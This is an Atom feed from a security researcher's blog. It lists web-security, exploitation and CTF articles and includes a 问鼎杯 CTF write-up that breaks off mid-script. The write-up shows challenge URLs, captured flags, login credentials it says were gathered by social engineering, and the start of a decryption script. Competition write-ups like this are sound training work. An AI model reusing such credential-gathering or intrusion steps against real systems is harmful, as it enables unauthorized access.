<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chybeta.github.io/"/>
  <updated>2017-09-16T14:38:34.297Z</updated>
  <id>http://chybeta.github.io/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://chybeta.github.io/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://chybeta.github.io/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-09-16T14:38:34.297Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">Code-Audit-Challenges</a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ICMSv7.0.1 admincp.class.php sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/09/04/hexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/">hexo-rss链接问题修复方法</a></li>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/">问鼎杯 CTF writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/">SEC-T CTF2017-Naughty ads-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/">SEC-T CTF2017-Sprinkler system-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/">ASISCTF2017-GSA File Server-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/">ASISCTF2017-Mathilda-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/">WeChall-PHP-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">TWCTF 2017-Super Secure Storage-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/">TWCTF 2017-Freshen Uploader-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/">ISG2017-wmwcms-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">HITB CTF 2017-Pasty-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/">Hackit2017-H4ck3rM1nd-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/">Hackit2017-Weekands of hacker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/">TWCTF 2017-swap-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/">ASISCTF2017-ASIS secret letter-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/">ASISCTF2017-Simple Crypto-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/">TWCTF 2017-Rev Rev Rev-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>问鼎杯 CTF writeup</title>
    <link href="http://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/"/>
    <id>http://chybeta.github.io/2017/09/16/问鼎杯-CTF-writeup/</id>
    <published>2017-09-16T04:41:43.000Z</published>
    <updated>2017-09-18T05:18:44.623Z</updated>
    
    <content type="html"><![CDATA[<p>问鼎杯 CTF writeup<br><a id="more"></a><br>队伍：Ph0en1x</p>
<h1 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h1><p><a href="http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2016.999999999999999" target="_blank" rel="external">http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2016.999999999999999</a></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WDFLAG=&#123;9c318582f7d864a9b4f9fcaab71657ce&#125;</div></pre></td></tr></table></figure></p>
<h1 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h1><p>返回的页面头里有一个账号信息，用户名为：Voldemort，密码为：123456。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/8.png?raw=true" alt=""></p>
<p>登陆后有个management。点击后跳转到：<a href="http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/admin.php" target="_blank" rel="external">http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/admin.php</a><br>查看源代码，有个js：<a href="http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/js/wdctffunction.js" target="_blank" rel="external">http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/js/wdctffunction.js</a></p>
<p>f12打开，控制台下getSecret():<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/9.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wdctf&#123;rev3aled_j3_funct10ns&#125;</div></pre></td></tr></table></figure></p>
<h1 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h1><p>后台地址： <a href="http://sec5.hdu.edu.cn/fuckme/login.php" target="_blank" rel="external">http://sec5.hdu.edu.cn/fuckme/login.php</a></p>
<p>社工后，用户名：847085251@qq.com ，密码：NB51A5</p>
<p>登陆后在未审核邮箱处找到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/10.png?raw=true" alt=""></p>
<p>访问：<a href="http://sec5.hdu.edu.cn/b7010bcfcdb62922d4e4a5ec8d79fb33.php" target="_blank" rel="external">http://sec5.hdu.edu.cn/b7010bcfcdb62922d4e4a5ec8d79fb33.php</a><br>跳转到：<a href="http://sec1.hdu.edu.cn/web/ww9ebmxnf1tlkn1d" target="_blank" rel="external">http://sec1.hdu.edu.cn/web/ww9ebmxnf1tlkn1d</a></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WDFLAG=&#123;b3057d3283090fc160d999d272f20e44&#125;</div></pre></td></tr></table></figure></p>
<h1 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h1><p>题目提供了一个 <code>++__++</code>文件，在kali下自动显示为一个压缩包，提取后得到一个<code>++__++</code>文件，发现是pcap。用wireshark打开。通过自带的导出功能，得到三个文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/5.png?raw=true" alt=""></p>
<p>但flag.rar被加密了无法直接解开。追踪一下tcp流，发现一个奇怪的字符串，直接用base64解是乱码。在它下面有一个py脚本。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/6.png?raw=true" alt=""></p>
<p>经过一番调试，最后解密脚本修正如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span 